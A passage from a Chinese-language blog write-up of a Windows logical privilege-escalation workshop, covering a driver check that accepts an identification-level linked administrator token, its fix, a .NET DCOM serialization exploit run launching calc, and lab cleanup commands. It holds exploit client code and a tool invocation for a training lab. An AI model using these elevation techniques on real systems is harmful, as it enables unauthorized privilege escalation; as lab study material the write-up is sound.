class="params">(PACCESS_TOKEN Token)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PTOKEN_ELEVATION Elevation = <span class="literal">NULL</span>;</span><br><span class="line">  BOOLEAN ret = FALSE;</span><br><span class="line">  <span class="keyword">if</span> (NT_SUCCESS(SeQueryInformationToken(Token, TokenElevation, &amp;Elevation)))</span><br><span class="line">  &#123;</span><br><span class="line">    ret = !!Elevation-&gt;TokenIsElevated;</span><br><span class="line">    ExFreePool(Elevation);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 客户端代码</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RunTestCallerToken</span><span class="params">(HANDLE handle, ControlCode code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  wstring option = GetArgument(<span class="string">"Impersonate Admin Token (Y/N)"</span>);</span><br><span class="line">  <span class="keyword">if</span> (option.size() &gt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">bool</span> impersonate = <span class="built_in">tolower</span>(option[<span class="number">0</span>]) == <span class="string">'y'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (impersonate)</span><br><span class="line">    &#123;</span><br><span class="line">      ScopedHandle proc_token;</span><br><span class="line">      <span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, proc_token.Ptr()))</span><br><span class="line">      &#123;</span><br><span class="line">        PrintError(<span class="string">"Couldn't open process token"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      ScopedHandle imp_token;</span><br><span class="line">      DWORD return_length = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (!GetTokenInformation(proc_token.Get(), TokenLinkedToken, imp_token.Ptr(), <span class="keyword">sizeof</span>(HANDLE), &amp;return_length))</span><br><span class="line">      &#123;</span><br><span class="line">        PrintError(<span class="string">"Couldn't get linked token"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!ImpersonateLoggedOnUser(imp_token.Get()))</span><br><span class="line">      &#123;</span><br><span class="line">        PrintError(<span class="string">"Couldn't impersonate token"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DWORD bytes_returned;</span><br><span class="line">    BOOL result = DeviceIoControl(handle, MAKE_IOCTL(code),</span><br><span class="line">      <span class="literal">nullptr</span>, <span class="number">0</span>, <span class="literal">nullptr</span>, <span class="number">0</span>, &amp;bytes_returned, <span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (impersonate)</span><br><span class="line">    &#123;</span><br><span class="line">      RevertToSelf();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!result)</span><br><span class="line">    &#123;</span><br><span class="line">      PrintError(<span class="string">"Error issuing device control"</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="UAC-与-TokenLinkedToken"><a href="#UAC-与-TokenLinkedToken" class="headerlink" title="UAC 与 TokenLinkedToken"></a>UAC 与 TokenLinkedToken</h3><p>当某个用户隶属于 Administrator 组时，用户启动的进程 token 中会嵌入 Administrator Token，只不过当 UAC 启用时，这个 token 不生效。尽管不生效，我们却可以通过 API GetTokenInformation() 获得这个 Administrator token，调用时 class 设定为 TokenLinkedToken。</p>
<p>既然可以得到 Administrator token，那不是可以直接调用 CreateProcessAsUser() 以 Administrator 身份创建进程了？</p>
<p>不是，还有 Impersonation Level，进程如果没有 SeTcbPrivilege，那 GetTokenInformation() 得到的 Administrator token 的 level 不是 SecurityImpersonation，而是 SecurityIdentification。也就是不能用这个 token 模仿管理员用户的行为，只能根据这个 token 知道 Administrator 有哪些 SID/Privileges。</p>
<p>什么进程会有 SeTcbPrivilege 权限？ MSDN 中说底层认证相关的服务有这个权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Only low-level authentication services should require this privilege.</span><br></pre></td></tr></table></figure>

<h3 id="漏洞出在哪"><a href="#漏洞出在哪" class="headerlink" title="漏洞出在哪"></a>漏洞出在哪</h3><p>驱动代码中检查 client 权限时，只检查了 token 的 TokenIsElevated 是否置位，却没有检查 token 的 SECURITY_IMPERSONATION_LEVEL。由于 client 没有 SeTcbPrivilege 权限，所以只得到了一个 SecurityIdentification level 的 Administrator token，是没有权限模拟管理员用户进程的。但驱动没有检查这里，所以返回的状态时成功 STATUS_SUCCESS。</p>
<p>漏洞的修复也比较简单，就是如代码中的 secure 判断分支：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if (secure)</span><br><span class="line"> &#123;</span><br><span class="line">   if (subject_context.ClientToken &amp;&amp; subject_context.ImpersonationLevel &lt; SecurityImpersonation)</span><br><span class="line">   &#123;</span><br><span class="line">     status = STATUS_BAD_IMPERSONATION_LEVEL;</span><br><span class="line">     goto error;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h3 id="impersonation-token-和-primary-token-如何选择"><a href="#impersonation-token-和-primary-token-如何选择" class="headerlink" title="impersonation token 和 primary token 如何选择"></a>impersonation token 和 primary token 如何选择</h3><p>什么时候使用 impersonation token 认证，什么时候使用 primary token？</p>
<p>下列几种情况时，即便存在 impersonation token，也会使用 primary token：</p>
<ul>
<li>处于 impersonating 状态的线程调用 CreateProcess 创建进程时，系统使用 primary token，新进程永远继承当前进程的 primary token.</li>
<li>如果某个函数需要 SE_TCB_NAME 权限时，例如 LogonUser()，系统会检查 primary token 中的权限。</li>
<li>如果某个函数需要 SE_AUDIT_NAME 权限时，例如 ObjectOpenAuditAlarm()，系统会检查 primary token 中的权限。</li>
<li>调用 OpenThreadToken() 时，可以选择使用 primary token 或者 impersonation token（通过参数 OpenAsSelf  指定）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">OpenThreadToken</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  HANDLE  ThreadHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  DWORD   DesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  BOOL    OpenAsSelf,</span></span></span><br><span class="line"><span class="function"><span class="params">  _Out_ PHANDLE TokenHandle</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><ul>
<li><p><a href="https://blogs.msdn.microsoft.com/winsdk/2013/03/22/how-to-launch-a-process-as-a-full-administrator-when-uac-is-enabled/" target="_blank" rel="noopener">How to launch a process as a Full Administrator when UAC is enabled</a></p>
</li>
<li><p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa379572(v=vs.85).aspx" target="_blank" rel="noopener">MSDN SECURITY_IMPERSONATION_LEVEL</a></p>
</li>
<li><p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa378832(v=vs.85).aspx" target="_blank" rel="noopener">Impersonation Levels</a></p>
</li>
<li><p><a href="https://technet.microsoft.com/en-us/library/cc976700.aspx" target="_blank" rel="noopener">MSDN Privileges 列表</a></p>
</li>
<li><p><a href="http://stackoverflow.com/questions/39403050/how-to-call-logonuser-to-get-a-non-restricted-full-token-inside-a-windows-serv" target="_blank" rel="noopener">How to call LogonUser() to get a non-restricted full token inside a Windows Service with UAC enabled?</a></p>
</li>
</ul>
<h2 id="13-DEMO-13-NET-DCOM-Elevation"><a href="#13-DEMO-13-NET-DCOM-Elevation" class="headerlink" title="13 DEMO 13 : .NET DCOM Elevation"></a>13 DEMO 13 : .NET DCOM Elevation</h2><h3 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h3><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">C:\workshop\ExploitTools&gt;ExploitDotNetDCOMSerialization.exe 801445a7-c5a9-468d-9423-81f9d13fee9b calc</span><br><span class="line">AddRef: 1</span><br><span class="line">Unknown IID &#123;ECC8691B-C1DB-4DC0-855E-65F6C551AF49&#125;</span><br><span class="line">Unknown IID &#123;00000003-0000-0000-C000-000000000046&#125;</span><br><span class="line">Unknown IID &#123;0000001B-0000-0000-C000-000000000046&#125;</span><br><span class="line">Queried for IUnknown</span><br><span class="line">AddRef: 2</span><br><span class="line">AddRef: 3</span><br><span class="line">Unknown IID &#123;00000018-0000-0000-C000-000000000046&#125;</span><br><span class="line">Unknown IID &#123;334D391F-0E79-3B15-C9FF-EAC65DD07C42&#125;</span><br><span class="line">Unknown IID &#123;00000040-0000-0000-C000-000000000046&#125;</span><br><span class="line">Unknown IID &#123;334D391F-0E79-3B15-C9FF-EAC65DD07C42&#125;</span><br><span class="line">Unknown IID &#123;94EA2B94-E9CC-49E0-C0FF-EE64CA8F5B90&#125;</span><br><span class="line">Unknown IID &#123;334D391F-0E79-3B15-C9FF-EAC65DD07C42&#125;</span><br><span class="line">Unknown IID &#123;77DD1250-139C-2BC3-BD95-900ACED61BE5&#125;</span><br><span class="line">Unknown IID &#123;334D391F-0E79-3B15-C9FF-EAC65DD07C42&#125;</span><br><span class="line">Unknown IID &#123;BFD60505-5A1F-4E41-88BA-A6FB07202DA9&#125;</span><br><span class="line">Unknown IID &#123;334D391F-0E79-3B15-C9FF-EAC65DD07C42&#125;</span><br><span class="line">Unknown IID &#123;03FB5C57-D534-45F5-A1F4-D39556983875&#125;</span><br><span class="line">Unknown IID &#123;334D391F-0E79-3B15-C9FF-EAC65DD07C42&#125;</span><br><span class="line">Unknown IID &#123;2C258AE7-50DC-49FF-9D1D-2ECB9A52CDD7&#125;</span><br><span class="line">Unknown IID &#123;00000019-0000-0000-C000-000000000046&#125;</span><br><span class="line">Unknown IID &#123;4C1E39E1-E3E3-4296-AA86-EC938D896E92&#125;</span><br><span class="line">Release: 2</span><br><span class="line">Unknown IID &#123;00000003-0000-0000-C000-000000000046&#125;</span><br><span class="line">Release: 1</span><br><span class="line">In GetHashCode</span><br><span class="line">In GetObjectData</span><br><span class="line">In GetObjectData</span><br><span class="line">Unknown IID &#123;C3FCC19E-A970-11D2-8B5A-00A0C9B7C9C4&#125;</span><br><span class="line">Unknown IID &#123;B196B283-BAB4-101A-B69C-00AA00341D07&#125;</span><br><span class="line">Unknown IID &#123;AF86E2E0-B12D-4C6A-9C5A-D7AA65101E90&#125;</span><br><span class="line">Unknown IID &#123;6E70ED5F-0439-38CE-83BB-860F1421F29F&#125;</span><br><span class="line">Queried for IHashCodeProvider</span><br><span class="line">AddRef: 2</span><br><span class="line">AddRef: 3</span><br><span class="line">Unknown IID &#123;1C733A30-2A1C-11CE-ADE5-00AA0044773D&#125;</span><br><span class="line">Queried for IHashCodeProvider</span><br><span class="line">AddRef: 4</span><br><span class="line">GetHashCode Called</span><br><span class="line"></span><br><span class="line">C:\workshop\ExploitTools&gt;</span><br></pre></td></tr></table></figure>

<h3 id="暂时放弃"><a href="#暂时放弃" class="headerlink" title="暂时放弃"></a>暂时放弃</h3><p>这个涉及到很多 COM 的知识，之前完全不懂，等日后有了这方面的基本了解之后再来补上</p>
<h2 id="14-环境恢复"><a href="#14-环境恢复" class="headerlink" title="14 环境恢复"></a>14 环境恢复</h2><p>如果在环境搭建过程中生成了虚拟机快照，提取出有用文件之后，恢复快照最方便。否则就按照下面的步骤恢复。管理员权限运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt;Bcdedit.exe -set TESTSIGNING OFF</span><br><span class="line">C:\WINDOWS\system32&gt;sc delete workshop</span><br><span class="line">C:\WINDOWS\system32&gt;powershell -Command &quot;Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Undefined&quot;</span><br></pre></td></tr></table></figure>

<p>如果修改了 Secure Boot，记得还原。关机重启，快速按 F2 进入 BIOS，选择 Boot 标签，将 Secure Boot 设置为 Enabled。</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
<li><p><a href="https://www.howtoip.com/how-to-disable-driver-signature-verification-on-64-bit-windows-81-so-that-you-can-install-unsigned-drivers/" target="_blank" rel="noopener">如何在64位Windows 8或10上禁用驱动程序签名验证（以便您可以安装未签名的驱动程序）</a></p>
</li>
<li><p><a href="https://msdn.microsoft.com/en-us/windows/hardware/drivers/install/the-testsigning-boot-configuration-option" target="_blank" rel="noopener">The TESTSIGNING Boot Configuration Option</a></p>
</li>
<li><p><a href="https://technet.microsoft.com/en-us/library/cc990289(v=ws.11).aspx" target="_blank" rel="noopener">MSDN sc create Command</a></p>
</li>
<li><p><a href="https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.security/set-executionpolicy" target="_blank" rel="noopener">MSDN PowerShell Set-ExecutionPolicy</a></p>
</li>
<li><p><a href="https://www.irongeek.com/i.php?page=security/altds" target="_blank" rel="noopener">Practical Guide to Alternative Data Streams in NTFS</a></p>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://rekken.github.io/2017/05/30/Windows-Logical-EoP-Workshop-Writeup/" data-id="ck79xs9oq000b1xrkdp8l401o" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2017/07/23/Analysis-and-Exploitation-of-GeekPwn-2016-Windows-Services-EoP-Vulnerability/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          GeekPwn 2016 Windows 服务提权漏洞的分析和利用
        
      </div>
    </a>
  
  
    <a href="/2017/01/01/hello-hexo/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Hello Hexo</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/macOS/">macOS</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/macOS/" style="font-size: 10px;">macOS</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/02/26/macOS-Security-Framework-and-Previous-CVEs-EN/">macOS Security Framework and previous CVEs</a>
          </li>
        
          <li>
            <a href="/2020/02/26/macOS-Security-Framework-and-Previous-CVEs-CN/">macOS Security Framework and previous CVEs</a>
          </li>
        
          <li>
            <a href="/2019/03/31/Analysis-of-Microsoft-Edge-Chakra-OP-NewScObjArray-Type-Confusion-Vulnerability/">Microsoft Edge Chakra OP_NewScObjArray 类型混淆漏洞分析笔记</a>
          </li>
        
          <li>
            <a href="/2017/07/23/Analysis-and-Exploitation-of-GeekPwn-2016-Windows-Services-EoP-Vulnerability/">GeekPwn 2016 Windows 服务提权漏洞的分析和利用</a>
          </li>
        
          <li>
            <a href="/2017/05/30/Windows-Logical-EoP-Workshop-Writeup/">Windows Logical EoP Workshop Writeup</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 rekken<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>